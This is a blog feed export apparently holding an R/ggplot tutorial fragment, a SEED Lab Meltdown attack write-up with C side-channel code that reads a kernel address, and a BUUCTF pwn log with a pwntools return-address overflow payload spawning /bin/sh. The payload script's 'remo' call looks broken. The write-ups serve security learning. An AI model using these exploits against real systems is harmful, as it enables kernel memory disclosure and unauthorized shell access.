class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs r">my_divide &lt;- <span class="hljs-keyword">function</span>(a, b) &#123;<br>  <span class="hljs-keyword">if</span> (b == <span class="hljs-number">0</span>) &#123;<br>    stop(<span class="hljs-string">&quot;Error: second parameter can&#x27;t be zero!&quot;</span>)<br>  &#125;<br>  result &lt;- a/b<br>  <span class="hljs-built_in">return</span>(result)<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="管道操作"><a href="#管道操作" class="headerlink" title="管道操作"></a>管道操作</h2><p>管道操作符 <code>%&gt;%</code> 将左侧表达式的结果作为右侧表达式的第一个参数进行传递</p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs r"><span class="hljs-comment"># 加载tidyverse包</span><br>library(tidyverse)<br><br><span class="hljs-comment"># 读取数据</span><br>data &lt;- read_csv(<span class="hljs-string">&quot;data.csv&quot;</span>)<br><br><span class="hljs-comment"># 进行数据清洗和转换</span><br>result &lt;- data %&gt;% <br>  filter(year &gt; <span class="hljs-number">2010</span>) %&gt;%           <span class="hljs-comment"># 只保留2010年之后的数据</span><br>  group_by(country) %&gt;%             <span class="hljs-comment"># 按国家分组</span><br>  summarize(avg_income = mean(income)) %&gt;%    <span class="hljs-comment"># 计算每个国家的平均收入</span><br>  arrange(desc(avg_income))         <span class="hljs-comment"># 按照平均收入降序排列</span><br><br><span class="hljs-comment"># 查看结果</span><br>result<br><br></code></pre></td></tr></table></figure><p>代码从一个CSV文件中读取数据，然后使用管道操作符对数据进行筛选、分组、汇总和排序等操作，最终得到一个按照平均收入降序排列的数据框。通过使用管道操作符，我们可以用更少的代码完成更多的工作，<strong>同时使代码更加易于理解</strong></p><h2 id="tidyreverse"><a href="#tidyreverse" class="headerlink" title="tidyreverse"></a>tidyreverse</h2><p>数据清洗和转换：</p><ul><li><code>filter()</code> 函数：根据条件筛选数据</li><li><code>select()</code> 函数：选择保留的列</li><li><code>mutate()</code> 函数：新增或修改数据列</li><li><code>group_by()</code> 函数：按照某个变量分组</li><li><code>summarize()</code> 函数：对每个分组进行汇总计算</li><li><code>arrange()</code> 函数：基于某个变量排序</li></ul><p>数据可视化：</p><ul><li><code>ggplot()</code> 函数：创建高质量的数据可视化图形</li><li><code>geom_*()</code> 函数：定义可视化图形的几何对象如点、线、区域等</li><li><code>aes()</code> 函数：设置图形的映射关系，如x轴、y轴和颜色等</li><li><code>theme()</code> 函数：调整图形的主题和外观</li></ul><h3 id="ggplot（grammar-of-graphics）"><a href="#ggplot（grammar-of-graphics）" class="headerlink" title="ggplot（grammar of graphics）"></a>ggplot（grammar of graphics）</h3><p>在 ggplot 中，图形是由图层 (layer) 组成的，每个图层包含以下三个部分：</p><ol><li>数据集（data）：即将要绘制的数据。</li><li>几何对象（geom）：用来描述数据中每个点、线、矩形等几何元素的形状和位置。</li><li>美学映射（aesthetics）：将数据中的变量映射到颜色、形状、大小等可视化属性上。</li></ol><p>以一段代码为例</p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs r">library(ggplot2)<br>ggplot(data = mtcars, aes(x = wt, y = mpg)) + <br>  geom_point(color = <span class="hljs-string">&quot;blue&quot;</span>)<br></code></pre></td></tr></table></figure><ul><li><p>ggplot 函数用来创建一个基本的空白图层，其中包括了数据集和美学映射的定义</p><ul><li>data：表示传入的数据集</li><li>aes()：表示美学映射，通常是一个用逗号隔开的字符变量列表，指定了数据中的哪些变量要映射到图形属性上</li></ul></li><li><p>几何对象函数（geom_*）。有很多，比如geom_point() 用来绘制散点图，geom_line() 用来绘制线性图</p></li><li><p>每个 ggplot 函数都可以通过加上各种图层来构成更加丰富的可视化效果。例如，可以使用 facet_grid() 函数为图像添加镶嵌面板、使用 scale_color_gradient() 函数来调整颜色渐变以及使用 theme() 来修改轴标签和标题的样式等。</p></li></ul><h1 id="将Rmd文件输出为PDF文件"><a href="#将Rmd文件输出为PDF文件" class="headerlink" title="将Rmd文件输出为PDF文件"></a>将Rmd文件输出为PDF文件</h1><p>在 R 语言中，<code>knit</code> 是一个用于将 RMarkdown 文档转换为纯文本或其他格式的函数。具体来说，<code>knit</code> 函数会读取 RMarkdown 文档中的 R 代码块，并执行这些代码块。然后，它会将执行结果（例如计算结果、图表、表格等）嵌入到 Markdown 或 LaTeX 格式的文本中，并生成最终的输出文件</p><p>要正确使用 <code>knit</code> 函数，你需要先安装并加载 <code>knitr</code> 包，可以使用 “Knit” 工具按钮调用 <code>knit</code> 函数，并通过设置 “Knit” 按钮下拉菜单中的选项来指定输出格式和其他选项</p><p>在 R 语言编译 rmd 文件的过程中，LaTeX 起到了将 Markdown 语法转换为 PDF 文档的作用。具体来说，当你使用 <code>pdf_document</code> 或 <code>beamer_presentation</code> 等输出格式时，RMarkdown 会将源文档转换为 LaTeX 格式，并使用 LaTeX 进行编译生成最终的 PDF 输出</p><p>为了编译出PDF，需要正确设置latex的编译器，在文件开头可以加几行yaml来指定，下面指定了xelatex，xelatex可以解决不能编译出中文字符的问题。要注意下面的缩进是不能更改的（被这个卡了很久</p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs r">---<br>title: <span class="hljs-string">&quot;My Document&quot;</span><br>output:<br>  pdf_document:<br>    latex_engine: xelatex<br>---<br><br><span class="hljs-comment"># Section 1</span><br><br>Some text.<br><br>​```&#123;r&#125;<br>summary(cars)<br></code></pre></td></tr></table></figure><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://bookdown.org/wangminjie/R4DS/index.html">https://bookdown.org/wangminjie/R4DS/index.html</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>seedlab：Meltdown Attack Lab</title>
    <link href="/p/a6055774/"/>
    <url>/p/a6055774/</url>
    
    <content type="html"><![CDATA[<h1 id="Lab-Environment"><a href="#Lab-Environment" class="headerlink" title="Lab Environment"></a>Lab Environment</h1><ul><li>熔断漏洞是英特尔 CPU 内部的一个缺陷，对 AMD 机器无效</li><li>熔断和幽灵攻击都使用 CPU 缓存作为侧通道窃取受保护的信息</li><li>seed预先构建的虚拟机提供了环境，因此我们需要在 Ubuntu 16.04 VM以完成实验，注意不要更新虚拟机的操作系统</li><li>使用<code>gcc -march=native -o myprog myprog.c</code>命令去编译程序，这里-march=native表示启用本地机器支持的所有指令子集</li></ul><h1 id="Task-1-Reading-from-Cache-versus-from-Memory"><a href="#Task-1-Reading-from-Cache-versus-from-Memory" class="headerlink" title="Task 1: Reading from Cache versus from Memory"></a>Task 1: Reading from Cache versus from Memory</h1><p>多次运行，观察发现每次<code>[3*4096]</code>和<code>[7*4096]</code>的CPU cycles都是最少的</p><p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/20230124101340.png"></p><h1 id="Task-2-Using-Cache-as-a-Side-Channel"><a href="#Task-2-Using-Cache-as-a-Side-Channel" class="headerlink" title="Task 2: Using Cache as a Side Channel"></a>Task 2: Using Cache as a Side Channel</h1><ul><li>secret是一个一字节的秘密值，我们通过cache的侧信道攻击方式猜出该值</li><li>一字节一共有256种可能，我们可以构造出大小为256*4096+1024的数组，由于访问过[secret*4096 + 1024]之后，该值会被cache，因此可以通过循环的方式依次访问[i]*4096+1024，使用时间最短的i就是被cache的secret值<ul><li>之所以使用4096，是因为它比典型的缓存块大(64字节) ，缓存是在块级别完成的，而不是在字节级别，因此定义一个包含256个元素的数组(即 array [256])是行不通的</li><li>之所以使用1024，是因为[0 * 4096]可能与相邻内存中的变量位于相同的缓存块中，为了避免与变量cache到相同的块中，[i*4096]需要加上1024的偏移</li></ul></li></ul><p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/20230124151051.png"></p><h1 id="Task-3-Place-Secret-Data-in-Kernel-Space"><a href="#Task-3-Place-Secret-Data-in-Kernel-Space" class="headerlink" title="Task 3: Place Secret Data in Kernel Space"></a>Task 3: Place Secret Data in Kernel Space</h1><p>MeltdownKernel.c使用一个内核模块来存储秘密数据</p><p>编译、安装内核模块，使用 dmesg 命令从内核消息缓冲区中查找秘密数据的地址secret data address：0xf9dcd000</p><p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/20230128174009.png"></p><p>用户级程序调用内核模块中的函数。此函数将访问机密数据，而不会将其泄露给用户级程序。这种访问的副作用是秘密数据现在位于 CPU 缓存中</p><h1 id="Task-4-Access-Kernel-Memory-from-User-Space"><a href="#Task-4-Access-Kernel-Memory-from-User-Space" class="headerlink" title="Task 4: Access Kernel Memory from User Space"></a>Task 4: Access Kernel Memory from User Space</h1><p>由于用户空间程序无法直接访问内核地址的数据，因此会导致segment fault</p><blockquote><p>访问被禁止的内存位置将发出 SIGSEGV 信号; 如果程序不自己处理这个异常，操作系统将处理它并终止程序。这就是程序崩溃的原因</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/20230128194724.png"></p><h1 id="Task-5-Handle-Error-Exceptions-in-C"><a href="#Task-5-Handle-Error-Exceptions-in-C" class="headerlink" title="Task 5: Handle Error/Exceptions in C"></a>Task 5: Handle Error/Exceptions in C</h1><p>为了避免task4中的segment fault，我们可以在程序中定义我们自己的信号处理程序来捕获由错误事件引发的异常，从而防止程序因错误事件而崩溃。访问被禁止的内存位置将发出 SIGSEGV 信号</p><p>与 C + + 或其他高级语言不同，C 不直接支持错误处理(也称为异常处理) ，例如 try/catch 子句。但是，我们可以使用 sigsetjmp ()和 siglongjmp()来模拟 try/catch 子句</p><p>关于代码的几点注释：</p><ul><li><strong>setjmp</strong>() saves the stack context/environment in <em>env</em>，<strong>sigsetjmp</strong>() is similar to <strong>setjmp</strong>(). If, and only if, <em>savesigs</em> is nonzero, the process’s current signal mask is saved in <em>env</em> and will be restored if a <strong><a href="https://linux.die.net/man/3/siglongjmp">siglongjmp</a></strong>(3) is later performed with this <em>env</em>。如果希望可移植地保存和恢复信号掩码，使用 sigsetjmp ()和 siglongjmp (3)</li><li>设置信号处理：signal(SIGSEGV, catch_segv)注册一个 SIGSEGV 信号处理程序，这样当一个 SIGSEGV 信号被引发时，处理程序函数 catch Segv ()将被调用</li><li>设置检查点：在信号处理程序完成对异常的处理之后，它需要让程序从特定的检查点继续执行。因此，我们需要首先定义一个检查点。使用 sigsetjmp ()实现的: sigsetjmp (jbuf，1)将堆栈上下文/环境保存在 jbuf 中，以供 siglongjmp ()稍后使用。参考：<a href="https://pubs.opengroup.org/onlinepubs/7908799/xsh/sigsetjmp.html">https://pubs.opengroup.org/onlinepubs/7908799/xsh/sigsetjmp.html</a></li><li>roll back到一个检查点: 当调用 siglongjmp (jbuf，1)时，保存在 jbuf 变量中的状态被复制回处理器，计算从 sigsetjmp ()函数的返回点开始，但是 sigsetjmp ()函数的返回值是 siglongjmp ()函数的第二个参数，在我们的例子中是1。因此，在异常处理之后，程序继续从 else 分支执行</li><li>触发异常: <code>char kernel_data = *(char*)kernel_data_addr; </code>处的代码将触发一个 SIGSEGV 信号，这是由于内存访问冲突(用户级程序不能访问内核内存)</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;setjmp.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">setjmp</span><span class="hljs-params">(jmp_buf env)</span></span>; <span class="hljs-comment">//参数env为用来保存目前堆栈环境</span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sigsetjmp</span><span class="hljs-params">(sigjmp_buf env, <span class="hljs-keyword">int</span> savesigs)</span></span>; <br><br><br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;setjmp.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;signal.h&gt;</span></span><br><br><span class="hljs-keyword">static</span> sigjmp_buf jbuf;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">catch_segv</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-comment">// Roll back to the checkpoint set by sigsetjmp().</span><br>  siglongjmp(jbuf, <span class="hljs-number">1</span>);                         <br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123; <br>  <span class="hljs-comment">// The address of our secret data</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> kernel_data_addr = <span class="hljs-number">0xfb61b000</span>;<br><br>  <span class="hljs-comment">// Register a signal handler</span><br>  signal(SIGSEGV, catch_segv);                     <br><br>  <span class="hljs-comment">//setjmp() and sigsetjmp() return 0 if returning directly</span><br>  <span class="hljs-keyword">if</span> (sigsetjmp(jbuf, <span class="hljs-number">1</span>) == <span class="hljs-number">0</span>) &#123;               <br>     <span class="hljs-comment">// A SIGSEGV signal will be raised. </span><br>     <span class="hljs-keyword">char</span> kernel_data = *(<span class="hljs-keyword">char</span>*)kernel_data_addr; <br><br>     <span class="hljs-comment">// The following statement will not be executed.</span><br>     <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Kernel data at address %lu is: %c\n&quot;</span>, <br>                    kernel_data_addr, kernel_data);<br>  &#125;<br>  <span class="hljs-keyword">else</span> &#123;<br>     <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Memory access violation!\n&quot;</span>);<br>  &#125;<br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Program continues to execute.\n&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>运行后输出：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">Memory <span class="hljs-keyword">access</span> violation!<br>Program continues <span class="hljs-keyword">to</span> <span class="hljs-keyword">execute</span>.<br></code></pre></td></tr></table></figure><h1 id="Task-6-Out-of-Order-Execution-by-CPU"><a href="#Task-6-Out-of-Order-Execution-by-CPU" class="headerlink" title="Task 6: Out-of-Order Execution by CPU"></a>Task 6: Out-of-Order Execution by CPU</h1><p>这个任务是为了验证乱序执行的存在</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">1</span> number = <span class="hljs-number">0</span>;<br><span class="hljs-number">2</span> kernel_address = (<span class="hljs-keyword">char</span>*)<span class="hljs-number">0xfb61b000</span>;<br><span class="hljs-number">3</span> kernel_data = *kernel_address;<span class="hljs-comment">//涉及两个操作: 加载数据(通常加载到寄存器中) ，以及检查是否允许数据访问</span><br><span class="hljs-number">4</span> number = number + kernel_data;<br></code></pre></td></tr></table></figure><p>对于如上语句，第3行将引发一个异常，因为地址为0xfb61b000的内存属于内核。因此，执行将在第3行被中断，而第4行将永远不会被执行，所以数字变量的值仍然是0</p><p>然而，现代高性能 CPU 不再严格按照指令的原始顺序执行指令，而是允许乱序执行耗尽所有的执行单元。第3行涉及两个操作: 加载数据(通常加载到寄存器中) ，以及检查是否允许数据访问。<strong>如果数据已经在 CPU 缓存中，那么第一个操作将非常快，而第二个操作可能需要一段时间。为了避免等待，CPU 将继续执行第4行和后续指令，同时并行执行访问检查</strong>。这是乱序执行。在访问检查完成之前，不会提交执行结果。由于访问了内核数据，检查失败了，因此由乱序执行引起的所有结果都将被丢弃，就像从未发生过一样。这就是为什么从外面我们看不到第四行被执行的原因</p><p><code>meltdown(0xfb61b000); </code>语句调用了meltdown函数，尽管该函数内的非法内存访问会导致异常，但是下一条语句，也即是<code>array[7 * 4096 + DELTA] += 1;</code>由于CPU乱序执行机制仍然会运行，从而将7纳入cache，之后我们调用reloadSideChannel可以得出秘密值是7</p><p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/20230129200746.png"></p><h1 id="Task-7-The-Basic-Meltdown-Attack"><a href="#Task-7-The-Basic-Meltdown-Attack" class="headerlink" title="Task 7: The Basic Meltdown Attack"></a>Task 7: The Basic Meltdown Attack</h1><h2 id="Task-7-1-A-Naive-Approach"><a href="#Task-7-1-A-Naive-Approach" class="headerlink" title="Task 7.1: A Naive Approach"></a>Task 7.1: A Naive Approach</h2><p>显示 Memory access violation</p><h2 id="Task-7-2-Improve-the-Attack-by-Getting-the-Secret-Data-Cached"><a href="#Task-7-2-Improve-the-Attack-by-Getting-the-Secret-Data-Cached" class="headerlink" title="Task 7.2: Improve the Attack by Getting the Secret Data Cached"></a>Task 7.2: Improve the Attack by Getting the Secret Data Cached</h2><p>熔断漏洞是一个竞争条件的漏洞，其中包括竞争条件之间的乱序执行和访问检查。乱序执行越快，我们能执行的指令就越多，我们就越有可能创造出可观察到的效果，帮助我们得到秘密数据</p><p>在我们的代码中，乱序执行的第一步是将内核数据加载到一个寄存器中。同时，对这样的访问执行安全检查。如果数据加载慢于安全检查，也就是说，当安全检查完成时，因为访问检查失败，内核数据仍然在从内存到寄存器的路上，乱序执行会立即中断并丢弃。我们的攻击也会失败</p><p>在这里可以先访问/proc/secret_data，使其在CPU cache中，这样可以加快数据加载的速度，从而利用竞态漏洞，在安全检查结束之前获得信息</p><p>在flushsidechannel后添加：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Open the /proc/secret_data virtual file.</span><br><span class="hljs-keyword">int</span> fd = open(<span class="hljs-string">&quot;/proc/secret_data&quot;</span>, O_RDONLY);<br><span class="hljs-keyword">if</span> (fd &lt; <span class="hljs-number">0</span>) &#123;<br>    perror(<span class="hljs-string">&quot;open&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br><span class="hljs-keyword">int</span> ret = pread(fd, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>); <span class="hljs-comment">// Cause the secret data to be cached.</span><br></code></pre></td></tr></table></figure><p>依旧显示 Memory access violation</p><h2 id="Task-7-3-Using-Assembly-Code-to-Trigger-Meltdown"><a href="#Task-7-3-Using-Assembly-Code-to-Trigger-Meltdown" class="headerlink" title="Task 7.3: Using Assembly Code to Trigger Meltdown"></a>Task 7.3: Using Assembly Code to Trigger Meltdown</h2><p>通过在内核内存访问之前添加几行汇编指令再做一次改进，关于汇编的写法，这里有一个参考<a href="https://meltdownattack.com/meltdown.pdf">https://meltdownattack.com/meltdown.pdf</a></p><p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/20230130204216.png"></p><h1 id="Task-8-Make-the-Attack-More-Practical"><a href="#Task-8-Make-the-Attack-More-Practical" class="headerlink" title="Task 8: Make the Attack More Practical"></a>Task 8: Make the Attack More Practical</h1><p>加一层循环即可</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> k=<span class="hljs-number">0</span>;k&lt;<span class="hljs-number">8</span>;k++)<br>&#123;<br>  <span class="hljs-built_in">memset</span>(scores, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(scores));<br>  flushSideChannel();<br>  <br>  <br>  <span class="hljs-comment">// Retry 1000 times on the same address.</span><br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000</span>; i++) &#123;<br>ret = pread(fd, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>  perror(<span class="hljs-string">&quot;pread&quot;</span>);<br>  <span class="hljs-keyword">break</span>;<br>&#125;<br><br><span class="hljs-comment">// Flush the probing array</span><br><span class="hljs-keyword">for</span> (j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">256</span>; j++) <br>_mm_clflush(&amp;<span class="hljs-built_in">array</span>[j * <span class="hljs-number">4096</span> + DELTA]);<br><br><span class="hljs-keyword">if</span> (sigsetjmp(jbuf, <span class="hljs-number">1</span>) == <span class="hljs-number">0</span>) &#123; meltdown_asm(<span class="hljs-number">0xfb61b000</span>); &#125;<br><br>reloadSideChannelImproved();<br>  &#125;<br><br>  <span class="hljs-comment">// Find the index with the highest score.</span><br>  <span class="hljs-keyword">int</span> max = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; i++) &#123;<br><span class="hljs-keyword">if</span> (scores[max] &lt; scores[i]) max = i;<br>  &#125;<br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The secret value is %d %c\n&quot;</span>, max, max);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The number of hits is %d\n&quot;</span>, scores[max]);<br>&#125;<br></code></pre></td></tr></table></figure><p>得到秘密信息：</p><p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/image-20230131165829797.png"></p>]]></content>
    
    
    <categories>
      
      <category>SEED-lab</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>buuctf-pwn刷题记录</title>
    <link href="/p/bdeaa012/"/>
    <url>/p/bdeaa012/</url>
    
    <content type="html"><![CDATA[<h1 id="test-your-nc1"><a href="#test-your-nc1" class="headerlink" title="test_your_nc1"></a>test_your_nc1</h1><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="xml">- Connect to a certain port:</span><br><span class="xml">  nc </span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">ip_address</span>&#125;&#125;</span><span class="xml"> </span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">port</span>&#125;&#125;</span><span class="xml"></span><br><span class="xml"></span><br><span class="xml">- Scan the open ports of a specified host:</span><br><span class="xml">  nc -v -z </span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">ip_address</span>&#125;&#125;</span><span class="xml"> </span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">port</span>&#125;&#125;</span><span class="xml"></span><br><span class="xml">  </span><br></code></pre></td></tr></table></figure><p>下载文件，ida f5，发现该文件直接执行system(/bin/sh)</p><p><code>nc ip port </code>获得目标shell，ls发现flag，直接cat flag即可</p><h1 id="RIP"><a href="#RIP" class="headerlink" title="RIP"></a>RIP</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">char</span> s[<span class="hljs-number">15</span>]; <span class="hljs-comment">// [rsp+1h] [rbp-Fh] BYREF</span><br><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;please input&quot;</span>);<br>  gets(s, argv);<br>  <span class="hljs-built_in">puts</span>(s);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;ok,bye!!!&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>shift+f12发现system和sh字符串都存在，看下代码段：</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sqf">.<span class="hljs-built_in">text</span>:<span class="hljs-number">000000000040118</span>A                 lea     rdi, command    ; <span class="hljs-string">&quot;/bin/sh&quot;</span><br>.<span class="hljs-built_in">text</span>:<span class="hljs-number">0000000000401191</span>                 <span class="hljs-built_in">call</span>    <span class="hljs-variable">_system</span><br></code></pre></td></tr></table></figure><p>保护：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">~$</span> <span class="hljs-string">pwn</span> <span class="hljs-string">checksec</span> <span class="hljs-string">pwn1</span><br>[<span class="hljs-string">*</span>] <span class="hljs-string">&#x27;/home/philo/pwn1&#x27;</span><br>    <span class="hljs-attr">Arch:</span>     <span class="hljs-string">amd64-64-little</span><br>    <span class="hljs-attr">RELRO:</span>    <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><br>    <span class="hljs-attr">Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><br>    <span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">disabled</span><br>    <span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x400000)</span><br>    <span class="hljs-attr">RWX:</span>      <span class="hljs-string">Has</span> <span class="hljs-string">RWX</span> <span class="hljs-string">segments</span><br></code></pre></td></tr></table></figure><p>直接利用缓冲区溢出把返回地址改一下就行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#context.log_level = &quot;debug&quot;</span><br><span class="hljs-comment">#context.terminal=[&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span><br><br>sh = remo(<span class="hljs-string">&#x27;./pwn1&#x27;</span>)<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * (<span class="hljs-number">0xf</span>+<span class="hljs-number">8</span>) + p64(<span class="hljs-number">0x40118A</span>)<br><br>sh.sendline(payload)<br><br>sh.interactive()<br></code></pre></td></tr></table></figure><h1 id="warmup-csaw-2016-1"><a href="#warmup-csaw-2016-1" 